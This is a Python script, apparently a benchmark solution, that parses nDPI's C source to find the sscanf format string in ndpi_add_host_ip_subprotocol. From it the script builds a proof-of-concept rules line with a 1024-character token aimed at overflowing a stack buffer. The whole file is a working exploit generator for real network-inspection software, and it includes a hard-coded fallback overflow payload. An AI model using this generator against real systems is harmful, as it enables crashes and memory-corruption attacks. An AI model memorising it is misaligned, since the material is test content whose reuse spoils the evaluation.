import os
import re
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        try:
            if os.path.isdir(src_path):
                root_dir = src_path
            else:
                tmpdir = tempfile.mkdtemp(prefix="ndpi_src_")
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
                root_dir = tmpdir

            fmt = None
            tail_index = None

            for root, _, files in os.walk(root_dir):
                for fn in files:
                    if not fn.endswith(".c"):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
                            code = f.read()
                    except Exception:
                        continue

                    res = self._locate_format_in_text(code)
                    if res is not None:
                        fmt, tail_index = res
                        break
                if fmt is not None:
                    break

            if fmt is not None:
                poc_line = self._build_poc_line(fmt, tail_index)
                return poc_line.encode("utf-8", "ignore")

            # Fallback: generic long token likely to overflow an unsafe %s in rules parser
            return b"host ip proto " + b"A" * 1024
        finally:
            if tmpdir is not None and os.path.isdir(tmpdir):
                shutil.rmtree(tmpdir, ignore_errors=True)

    # ---------- High-level analysis helpers ----------

    def _locate_format_in_text(self, text):
        """
        Find ndpi_add_host_ip_subprotocol definition in given C source text
        and extract the sscanf format string and index of the argument bound
        to the 'tail' buffer.
        """
        pattern = re.compile(
            r'\bndpi_add_host_ip_subprotocol\s*\([^;{]*\)\s*\{',
            re.DOTALL,
        )
        m = pattern.search(text)
        if not m:
            return None

        brace_pos = m.end() - 1
        end_brace = self._match_bracket(text, brace_pos, '{', '}')
        if end_brace is None:
            body = text[brace_pos:]
        else:
            body = text[brace_pos:end_brace + 1]

        fmt, tail_index = self._analyze_function(body)
        if fmt is None:
            return None
        return fmt, tail_index

    def _analyze_function(self, code):
        """
        Within the function body, locate sscanf calls that write into 'tail'
        and extract their format strings and the index of the corresponding
        conversion specifier.
        """
        if "tail" not in code or "sscanf" not in code:
            return None, None

        pos = 0
        while True:
            idx = code.find("sscanf", pos)
            if idx == -1:
                break

            paren_idx = code.find("(", idx)
            if paren_idx == -1:
                break

            end_paren = self._match_bracket(code, paren_idx, "(", ")")
            if end_paren is None:
                break

            args_str = code[paren_idx + 1:end_paren]
            args = self._split_args(args_str)
            if len(args) < 3:
                pos = end_paren + 1
                continue

            tail_arg_idx = None
            for j in range(2, len(args)):
                if re.search(r'\btail\b', args[j]):
                    tail_arg_idx = j
                    break
            if tail_arg_idx is None:
                pos = end_paren + 1
                continue

            fmt = self._extract_format_string(code, paren_idx, end_paren)
            if fmt is None:
                pos = end_paren + 1
                continue

            spec_index = tail_arg_idx - 2
            return fmt, spec_index

        return None, None

    # ---------- Low-level C parsing utilities ----------

    def _match_bracket(self, text, pos, open_ch, close_ch):
        """
        Find the matching closing bracket for the bracket at position pos.
        Handles strings and comments conservatively.
        """
        depth = 1
        i = pos + 1
        n = len(text)

        in_str = False
        str_ch = ""
        in_char = False
        in_line_comment = False
        in_block_comment = False
        esc = False

        while i < n:
            ch = text[i]

            if in_str:
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == str_ch:
                    in_str = False
                i += 1
                continue

            if in_char:
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == "'":
                    in_char = False
                i += 1
                continue

            if in_line_comment:
                if ch == "\n":
                    in_line_comment = False
                i += 1
                continue

            if in_block_comment:
                if ch == "*" and i + 1 < n and text[i + 1] == "/":
                    in_block_comment = False
                    i += 2
                    continue
                i += 1
                continue

            if ch == '"':
                in_str = True
                str_ch = '"'
                esc = False
                i += 1
                continue
            if ch == "'":
                in_char = True
                esc = False
                i += 1
                continue
            if ch == "/" and i + 1 < n:
                nxt = text[i + 1]
                if nxt == "/":
                    in_line_comment = True
                    i += 2
                    continue
                if nxt == "*":
                    in_block_comment = True
                    i += 2
                    continue

            if ch == open_ch:
                depth += 1
            elif ch == close_ch:
                depth -= 1
                if depth == 0:
                    return i

            i += 1

        return None

    def _split_args(self, argstr):
        """
        Split function argument list into individual arguments,
        respecting parentheses and string literals.
        """
        args = []
        current = []
        depth = 0
        in_str = False
        str_ch = ""
        esc = False

        for ch in argstr:
            if in_str:
                current.append(ch)
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == str_ch:
                    in_str = False
                continue

            if ch in ('"', "'"):
                in_str = True
                str_ch = ch
                current.append(ch)
            elif ch == "(":
                depth += 1
                current.append(ch)
            elif ch == ")":
                depth -= 1
                current.append(ch)
            elif ch == "," and depth == 0:
                arg = "".join(current).strip()
                if arg:
                    args.append(arg)
                current = []
            else:
                current.append(ch)

        if current:
            arg = "".join(current).strip()
            if arg:
                args.append(arg)

        return args

    def _extract_format_string(self, text, paren_start, paren_end):
        """
        Extract the first double-quoted C string literal between paren_start
        and paren_end, and unescape it.
        """
        segment = text[paren_start:paren_end + 1]
        start = segment.find('"')
        if start == -1:
            return None

        i = start + 1
        esc = False
        n = len(segment)
        while i < n:
            ch = segment[i]
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                raw = segment[start + 1:i]
                return self._unescape_c_string(raw)
            i += 1
        return None

    def _unescape_c_string(self, s):
        """
        Simplified C string unescape (handles common escapes).
        """
        out = []
        i = 0
        n = len(s)
        while i < n:
            ch = s[i]
            if ch != "\\":
                out.append(ch)
                i += 1
                continue

            i += 1
            if i >= n:
                break
            c = s[i]

            if c == "n":
                out.append("\n")
                i += 1
            elif c == "t":
                out.append("\t")
                i += 1
            elif c == "r":
                out.append("\r")
                i += 1
            elif c == "\\":
                out.append("\\")
                i += 1
            elif c == '"':
                out.append('"')
                i += 1
            elif c in "01234567":
                # Octal escape, up to 3 digits (including this one)
                val = 0
                count = 0
                while i < n and count < 3 and s[i] in "01234567":
                    val = val * 8 + (ord(s[i]) - ord("0"))
                    i += 1
                    count += 1
                out.append(chr(val & 0xFF))
            elif c == "x":
                # Hex escape, up to 2 hex digits
                i += 1
                val = 0
                count = 0
                while i < n and count < 2 and s[i] in "0123456789abcdefABCDEF":
                    val = val * 16 + int(s[i], 16)
                    i += 1
                    count += 1
                if count > 0:
                    out.append(chr(val & 0xFF))
            else:
                # Default: treat unknown escape as the char itself
                out.append(c)
                i += 1

        return "".join(out)

    # ---------- Format parsing and PoC construction ----------

    def _parse_format(self, fmt):
        """
        Parse a scanf-style format string into a list of (delimiter, spec)
        pairs and the trailing delimiter after the last spec.
        """
        pieces = []
        i = 0
        n = len(fmt)
        last_end = 0

        while i < n:
            ch = fmt[i]
            if ch == "%":
                if i + 1 < n and fmt[i + 1] == "%":
                    # literal '%', part of delimiter
                    i += 2
                    continue

                # Start of a conversion specifier
                delim = fmt[last_end:i]

                j = i + 1
                # Assignment suppression
                if j < n and fmt[j] == "*":
                    j += 1
                # Width
                while j < n and fmt[j].isdigit():
                    j += 1
                # Length modifiers
                while j < n and fmt[j] in "hlLzjt":
                    j += 1

                if j < n and fmt[j] == "[":
                    # scanset %[...]
                    j += 1
                    if j < n and fmt[j] == "]":
                        j += 1
                    while j < n and fmt[j] != "]":
                        j += 1
                    if j < n:
                        j += 1
                else:
                    if j < n:
                        j += 1

                spec = fmt[i:j]
                pieces.append((delim, spec))
                last_end = j
                i = j
            else:
                i += 1

        tail_delim = fmt[last_end:]
        return pieces, tail_delim

    def _spec_type(self, spec):
        if spec.endswith("]"):
            return "["
        return spec[-1] if spec else ""

    def _generate_value_for_spec(self, spec, is_tail):
        conv = self._spec_type(spec)
        if not is_tail:
            if conv in "diouxX":
                return "1"
            if conv in "fFeEgGaA":
                return "1.0"
            if conv in "cC":
                return "A"
            if conv == "p":
                return "0x1"
            if conv in "s[":
                return "B"
            if conv == "n":
                # %n does not consume input; give something small
                return ""
            return "1"

        # Tail spec: we want a large token to overflow the stack buffer
        big_len = 1024
        if conv in "s[":
            return "A" * big_len
        if conv in "cC":
            return "Z" * big_len
        if conv in "diouxXfFeEgGaApn":
            return "9" * big_len
        return "A" * big_len

    def _build_poc_line(self, fmt, tail_index):
        pieces, _ = self._parse_format(fmt)
        if not pieces:
            return "A" * 1024

        if tail_index < 0 or tail_index >= len(pieces):
            tail_index = len(pieces) - 1

        out_parts = []
        for i, (delim, spec) in enumerate(pieces):
            if delim:
                out_parts.append(delim)
            is_tail = (i == tail_index)
            val = self._generate_value_for_spec(spec, is_tail)
            out_parts.append(val)

        return "".join(out_parts)
